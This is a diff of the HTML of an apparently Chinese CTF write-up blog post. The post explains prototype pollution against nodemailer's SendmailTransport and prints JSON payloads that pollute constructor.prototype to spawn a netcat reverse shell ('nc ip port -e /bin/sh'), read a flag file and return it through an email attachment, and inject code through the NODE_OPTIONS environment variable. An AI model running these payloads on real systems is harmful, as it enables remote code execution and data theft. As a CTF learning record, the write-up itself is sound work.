+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">createTransport</span> = <span class="keyword">function</span> (<span class="params">transporter, defaults</span>) &#123;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (options.<span class="property">pool</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">SMTPPool</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">sendmail</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">SendmailTransport</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">streamTransport</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">StreamTransport</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">jsonTransport</span>) &#123;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 
 <p>只要<code>options.sendmail</code>的值为真，就会实例化<code>SendmailTransport</code>类，也就是我们上面要进行原型链污染的类</p>
 <p>至此可以尝试构造原型链污染如下</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;
-	&quot;constructor.prototype.sendmail&quot;:true,
-	&quot;constructor.prototype.path&quot;:&quot;sh&quot;,
-	&quot;constructor.prototype.args&quot;:[&quot;-c&quot;,&quot;nc ip port -e &#x2F;bin&#x2F;sh&quot;]
-&#125;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;constructor.prototype.sendmail&quot;:true,</span><br><span class="line">	&quot;constructor.prototype.path&quot;:&quot;sh&quot;,</span><br><span class="line">	&quot;constructor.prototype.args&quot;:[&quot;-c&quot;,&quot;nc ip port -e /bin/sh&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这个poc是用于反弹shell的，因为我的SMTP服务器配置有问题，所以只能这样做。</p>
 <p><img src="/../../img/8-bit%20pub-images/6.png"></p>
@@ -308,34 +159,15 @@ module.exports &#x3D; send;</code></pre>
 <p>这边放一下其他师傅通过任意读文获得flag的方式</p>
 <p>在nodemailer文档中发现使用attachments 可以进行任意文件读取</p>
 <p>先把文件写到tmp目录下</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;
-    &quot;constructor.prototype.sendmail&quot;:true,
-    &quot;constructor.prototype.path&quot;:&quot;sh&quot;,
-    &quot;constructor.prototype.args&quot;:[
-        &quot;-c&quot;,
-        &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;flag.txt&quot;
-    ]
-&#125;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;constructor.prototype.sendmail&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.args&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>再利用attachments带出</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#123;
-    &quot;to&quot;:&quot;i@example.com&quot;,
-    &quot;subject&quot;:&quot;flag&quot;,
-    &quot;constructor.prototype.attachments&quot;:[
-        &#123;
-            &quot;filename&quot;:&quot;flag.txt&quot;,
-            &quot;path&quot;:&quot;&#x2F;tmp&#x2F;flag.txt&quot;
-        &#125;
-    ]
-&#125;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;to&quot;</span>:<span class="string">&quot;i@example.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subject&quot;</span>:<span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.attachments&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag.txt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>以下是之前构造错误的原型链，没有双引号，等号当冒号用，nc反弹shell格式出错。。用于提醒自己</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;
-	constructor.prototype.path&#x3D;bash
-	constructor.prototype.args&#x3D;[nc,ip,port]
-&#125;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	constructor.prototype.path=bash</span><br><span class="line">	constructor.prototype.args=[nc,ip,port]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -343,12 +175,7 @@ module.exports &#x3D; send;</code></pre>
 <blockquote>
 <p>这里就比较直接了，因为nodemailer是有require<code>child_process</code>库的，那么我们可以使用<a target="_blank" rel="noopener" href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>方法，污染env和shell，先放payload</p>
 </blockquote>
-<pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;
-    &quot;constructor.prototype.sendmail&quot;: True,
-    &quot;constructor.prototype.shell&quot;:&quot;node&quot;,
-    &quot;constructor.prototype.env.NODE_DEBUG&quot;: &quot;require(&#39;child_process&#39;).execSync(&#39;nc ip port -e &#x2F;bin&#x2F;bash&#39;);process.exit();&#x2F;&#x2F;&quot;,
-    &quot;constructor.prototype.env.NODE_OPTIONS&quot;:&quot;-r &#x2F;proc&#x2F;self&#x2F;environ&quot;
-&#125;</code></pre>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.sendmail&quot;</span><span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.shell&quot;</span><span class="punctuation">:</span><span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.NODE_DEBUG&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;nc ip port -e /bin/bash&#x27;);process.exit();//&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.NODE_OPTIONS&quot;</span><span class="punctuation">:</span><span class="string">&quot;-r /proc/self/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>这里污染了环境变量之后，每次以node执行命令的时候，就会加载<code>NODE_OPTIONS</code>选项，从而执行<code>/proc/self/environ</code>中存在的js代码，那么就很简单了，当默认使用发邮件的时候，spawn会调用默认的shell，也就是&#x2F;bin&#x2F;sh</p>
@@ -359,8 +186,10 @@ module.exports &#x3D; send;</code></pre>
 
     </div>
 </article>
-
+<!--把higlightAll放到最后，确保DOM都加载完成-->
+<script>hljs.highlightAll();</script>
 <script src="/js/codeblock.js"></script>
+
 <!--显示文章页相关内容-->
             <!--body是一个变量，代表页面的主要内容。在渲染模板时，这个变量会被替换为实际的内容。-->
             
